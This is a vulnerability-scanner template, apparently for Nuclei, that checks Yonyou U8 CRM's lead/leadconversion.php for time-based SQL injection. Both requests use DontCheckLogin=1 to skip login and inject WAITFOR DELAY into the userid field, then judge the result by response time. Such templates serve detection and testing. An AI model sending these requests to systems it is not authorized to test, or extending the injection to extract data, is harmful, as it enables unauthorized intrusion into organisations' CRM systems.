@@ -1,0 +1,38 @@
+id: yongyouU8-CRM-leadconversion_php-sql
+
+info:
+  name: 用友U8 CRM lead/leadconversion.php SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        userid=1%27;WAITFOR+DELAY+%270:0:4%27--
+
+      - |
+        POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        userid=1%27;WAITFOR+DELAY+%270:0:8%27--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
